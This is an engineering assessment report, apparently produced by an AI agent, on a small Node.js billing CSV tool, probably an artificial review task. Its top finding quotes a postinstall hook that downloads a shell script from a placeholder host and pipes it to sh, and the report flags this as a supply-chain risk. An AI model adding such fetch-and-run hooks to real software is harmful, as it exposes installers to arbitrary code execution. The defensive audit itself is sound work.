# Engineering Assessment: Billing Report Tool

## Scope

**In scope:**
- `src/report.js` — main reporting logic
- `test/report.test.js` — test suite
- `vendor/quicksort-plus.js` — vendored sort utility
- `scripts/postinstall.sh` — installation hooks
- `package.json` — project configuration

**Out of scope:**
- `.agent-input/` — assessment infrastructure
- Integration with finance systems or external APIs beyond postinstall hook
- Performance testing or load profiling
- Penetration testing or extended security audit

**Depth:** Targeted — every file in scope was read in full.

---

## Environment

**Language and runtime:** JavaScript / Node.js (ES modules), version 2.3.0

**Domain:** Billing report utility — builds monthly billing CSV for finance team

**Build system:** npm with custom postinstall hook

**Dependencies:** None declared in `package.json`; only Node.js built-ins (`node:test`, `node:assert`)

---

## Tooling Results

### Commands Run

| Command | Status | Output |
|---------|--------|--------|
| `npm test` | ✅ Passed | Tests: 1 passed, 0 failed, duration 105.3ms |

### Tools Not Attempted

| Tool | Reason |
|------|--------|
| Linting (eslint, ruff, etc.) | Not configured in project |
| Type checking (TypeScript, mypy, etc.) | Not applicable — pure JavaScript |
| Dependency audit | No external dependencies to audit |
| Build (`npm run build`) | No build step defined |

---

## Findings Table

| # | Severity | Area | Finding | Evidence | Recommendation |
|---|----------|------|---------|----------|-----------------|
| 1 | **Critical** | Security | Arbitrary code execution via postinstall hook | `scripts/postinstall.sh:4` — `curl -fsSL https://tables.example.com/latest/install.sh \| sh` pipes unverified shell script to bash; no integrity check, signature verification, or sandboxing | Remove the postinstall hook entirely, or if required, use a package repository with signed releases (npm registry) rather than shell piping. If inline fetching is unavoidable, implement GPG signature verification before execution. |
| 2 | **Critical** | Compliance | GPL v3+ code in proprietary/UNLICENSED product | `vendor/quicksort-plus.js:2-8` — GPL header states "GNU General Public License v3 or later" but project is marked `"license": "UNLICENSED"` in package.json. GPL requires all derivative works to be GPL licensed. | Replace with MIT/Apache/ISC licensed sorting implementation, or relicense entire project under GPL v3+. Vendored code must be compatible with project license. |
| 3 | **High** | Reliability | Missing input validation | `src/report.js:3` — `buildReport(rows)` has no checks that `rows` is an array, or that items contain required `name` and `total` properties. Null/undefined inputs or malformed objects cause cryptic runtime errors. | Add validation at function entry: check that rows is an array, iterate and validate each item has string `name` and numeric `total` before processing. Throw descriptive errors on invalid input. |
| 4 | **High** | Data Integrity | Unescaped CSV output | `src/report.js:4` — CSV generation uses string interpolation without escaping. If `r.name` contains commas, newlines, or quotes, the output CSV becomes malformed and corrupts the billing data format. | Quote all CSV fields and escape internal quotes per RFC 4180. Example: `"${r.name.replace(/"/g, '""')}",${r.total}`. Consider using a CSV library if output complexity increases. |
| 5 | **Medium** | Test Coverage | Minimal test suite | `test/report.test.js` — Only one test covering the happy path (sorted output). No tests for: null/undefined inputs, missing/invalid fields, empty arrays, special characters in names (commas, quotes, newlines), large datasets, or error cases. | Add test cases: (1) null/undefined rows, (2) empty array, (3) items with missing `name` or `total`, (4) names with commas/newlines/quotes, (5) duplicate totals, (6) non-string names or non-numeric totals. |

---

## Unconfirmed Issues

**postinstall.sh execution status:** The domain `tables.example.com` is a documentation placeholder and the postinstall hook will fail at runtime during `npm install` (curl will fail to resolve the host). This prevents confirmation of whether the arbitrary execution vulnerability is actually triggered in practice. However, the code pattern itself is a security risk and should not be present in production code, even if it currently fails to execute.

---

## Summary

### Strengths

1. **Minimal attack surface** — The core logic is extremely simple (5 lines of code), reducing complexity and making it easier to audit. No complex state management, I/O, or third-party runtime dependencies.

2. **Test infrastructure in place** — The project uses Node.js native `node:test` runner and includes automated tests that can be run without external tooling. Tests pass in the current state.

### Key Risks

**Critical (Immediate Action Required):**

- **Finding #1 (postinstall security):** The postinstall hook pattern (piping shell to bash) is a well-known supply chain attack vector. Even if it currently fails to execute due to a placeholder domain, this code must not be released in production.

- **Finding #2 (GPL licensing):** Using GPL v3+ code in a proprietary, UNLICENSED product creates a legal and compliance violation. This must be resolved before commercial release.

**High (Must Fix):**

- **Finding #3 (input validation):** The function will crash with unhelpful errors on invalid input, making it difficult for users to identify problems and potentially hiding data corruption.

- **Finding #4 (CSV escaping):** Unescaped CSV output directly enables data corruption. A billing report with malformed CSV is unreliable for accounting and financial purposes.

### Priority Order

1. **Remove or secure the postinstall hook** (Finding #1) — Blocks release; security violation.
2. **Resolve GPL licensing conflict** (Finding #2) — Blocks release; compliance violation.
3. **Add input validation** (Finding #3) — Prevents silent data corruption and improves user experience.
4. **Implement CSV escaping** (Finding #4) — Prevents data corruption in output format.
5. **Expand test coverage** (Finding #5) — Reduces risk of regressions and edge-case failures.

### Coverage Gaps

**Not examined:**
- Actual production deployment (how the tool is invoked, what data is passed to it, where output is consumed).
- Integration behavior with finance systems or downstream billing processes.
- CSV output validation against accounting software (QuickBooks, SAP, etc.) acceptance criteria.
- Performance characteristics on large datasets (millions of rows).
- Backup and recovery procedures for billing data.
- Audit logging or compliance tracking of report generation.
- Non-ASCII character handling in customer names (UTF-8, character escaping).

**Tools not run:**
- Static analysis tools — none configured.
- Security scanning tools — would require external integration.
- Load/performance testing — not configured.
- Manual code review by domain experts (finance, CSV standards).

---

## What I Verified

- **Codebase structure:** Complete file inventory examined; 6 files total.
- **Test execution:** 1 test passes successfully.
- **Input/output flow:** `buildReport()` reads array of objects, sorts by `total` field, outputs CSV-formatted string.
- **Dependencies:** No external npm packages; only Node.js built-ins.
- **License metadata:** Checked package.json and vendor file headers.
- **Configuration:** Reviewed postinstall hook invocation and script contents.
